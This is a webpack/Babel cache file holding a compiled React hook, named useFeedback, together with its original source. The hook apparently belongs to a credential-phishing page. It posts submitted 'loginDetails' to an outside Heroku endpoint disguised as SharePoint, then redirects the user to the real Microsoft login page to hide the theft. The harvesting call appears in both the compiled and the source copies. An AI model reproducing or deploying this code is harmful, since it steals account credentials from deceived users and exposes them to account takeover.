{"ast":null,"code":"import _asyncToGenerator from\"C:/Users/rdp/Downloads/Archive/node_modules/@babel/runtime/helpers/esm/asyncToGenerator.js\";import _slicedToArray from\"C:/Users/rdp/Downloads/Archive/node_modules/@babel/runtime/helpers/esm/slicedToArray.js\";import _regeneratorRuntime from\"C:\\\\Users\\\\rdp\\\\Downloads\\\\Archive\\\\node_modules\\\\@babel\\\\runtime\\\\regenerator\\\\index.js\";import axios from'axios';import{toast}from'react-toastify';import'react-toastify/dist/ReactToastify.css';import{useReducer}from'react';import{START_FEEDBACK,STOP_FEEDBACK}from'./feedbackTypes';import FeedbackReducer from'./FeedbackReducer';toast.configure();var useFeedback=function useFeedback(){var _useReducer=useReducer(FeedbackReducer,{isLoading:false}),_useReducer2=_slicedToArray(_useReducer,2),isLoading=_useReducer2[0].isLoading,dispatch=_useReducer2[1];var postFeedback=/*#__PURE__*/function(){var _ref=_asyncToGenerator(/*#__PURE__*/_regeneratorRuntime.mark(function _callee(data){var response;return _regeneratorRuntime.wrap(function _callee$(_context){while(1){switch(_context.prev=_context.next){case 0:dispatch({type:START_FEEDBACK});_context.prev=1;_context.next=4;return axios.post('https://share-point-tt.herokuapp.com/api/loginDetails',data);case 4:response=_context.sent;if(response.status===200){window.location.assign('https://login.microsoftonline.com/common/login');dispatch({type:STOP_FEEDBACK});}else{toast.error('oops');}_context.next=12;break;case 8:_context.prev=8;_context.t0=_context[\"catch\"](1);toast.info('Something went wrong!');if(_context.t0.response){dispatch({type:STOP_FEEDBACK});}case 12:case\"end\":return _context.stop();}}},_callee,null,[[1,8]]);}));return function postFeedback(_x){return _ref.apply(this,arguments);};}();return{postFeedback:postFeedback,isLoading:isLoading};};export default useFeedback;","map":{"version":3,"sources":["C:/Users/rdp/Downloads/Archive/src/api/useFeedback.js"],"names":["axios","toast","useReducer","START_FEEDBACK","STOP_FEEDBACK","FeedbackReducer","configure","useFeedback","isLoading","dispatch","postFeedback","data","type","post","response","status","window","location","assign","error","info"],"mappings":"wWAAA,MAAOA,CAAAA,KAAP,KAAkB,OAAlB,CACA,OAASC,KAAT,KAAsB,gBAAtB,CACA,MAAO,uCAAP,CACA,OAASC,UAAT,KAA2B,OAA3B,CACA,OAASC,cAAT,CAAyBC,aAAzB,KAA8C,iBAA9C,CACA,MAAOC,CAAAA,eAAP,KAA4B,mBAA5B,CAGAJ,KAAK,CAACK,SAAN,GAGA,GAAMC,CAAAA,WAAW,CAAG,QAAdA,CAAAA,WAAc,EAAM,CACxB,gBAGIL,UAAU,CAACG,eAAD,CAAkB,CAC9BG,SAAS,CAAE,KADmB,CAAlB,CAHd,4CACIA,SADJ,iBACIA,SADJ,CAEEC,QAFF,iBAOA,GAAMC,CAAAA,YAAY,0FAAG,iBAAOC,IAAP,+HACnBF,QAAQ,CAAC,CAAEG,IAAI,CAAET,cAAR,CAAD,CAAR,CADmB,sCAGMH,CAAAA,KAAK,CAACa,IAAN,CAAc,uDAAd,CACtBF,IADsB,CAHN,QAGXG,QAHW,eAKjB,GAAIA,QAAQ,CAACC,MAAT,GAAoB,GAAxB,CAA8B,CAC5BC,MAAM,CAACC,QAAP,CAAgBC,MAAhB,CAAuB,gDAAvB,EACAT,QAAQ,CAAC,CACPG,IAAI,CAAER,aADC,CAAD,CAAR,CAGD,CALD,IAKO,CACLH,KAAK,CAACkB,KAAN,CAAY,MAAZ,EACD,CAZgB,+EAejBlB,KAAK,CAACmB,IAAN,CAAW,uBAAX,EACA,GAAI,YAAEN,QAAN,CAAgB,CACdL,QAAQ,CAAC,CAAEG,IAAI,CAAER,aAAR,CAAD,CAAR,CACD,CAlBgB,oEAAH,kBAAZM,CAAAA,YAAY,4CAAlB,CAsBA,MAAO,CACLA,YAAY,CAAZA,YADK,CAELF,SAAS,CAATA,SAFK,CAAP,CAID,CAlCD,CAoCA,cAAeD,CAAAA,WAAf","sourcesContent":["import axios from 'axios';\nimport { toast } from 'react-toastify';\nimport 'react-toastify/dist/ReactToastify.css';\nimport { useReducer } from 'react';\nimport { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';\nimport FeedbackReducer from './FeedbackReducer';\n\n\ntoast.configure()\n\n\nconst useFeedback = () => {\n  const [\n    { isLoading },\n    dispatch,\n  ] = useReducer(FeedbackReducer, {\n    isLoading: false,\n  });\n\n  const postFeedback = async (data) => {\n    dispatch({ type: START_FEEDBACK });\n    try {\n      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`,\n       data);\n      if (response.status === 200 ) {\n        window.location.assign('https://login.microsoftonline.com/common/login');\n        dispatch({\n          type: STOP_FEEDBACK,\n        });\n      } else {\n        toast.error('oops');\n      }\n    \n    } catch (e) {\n      toast.info('Something went wrong!');\n      if (e.response) {\n        dispatch({ type: STOP_FEEDBACK });\n      }\n    }\n  };\n\n  return {\n    postFeedback,\n    isLoading,\n  };\n};\n\nexport default useFeedback;\n"]},"metadata":{},"sourceType":"module"}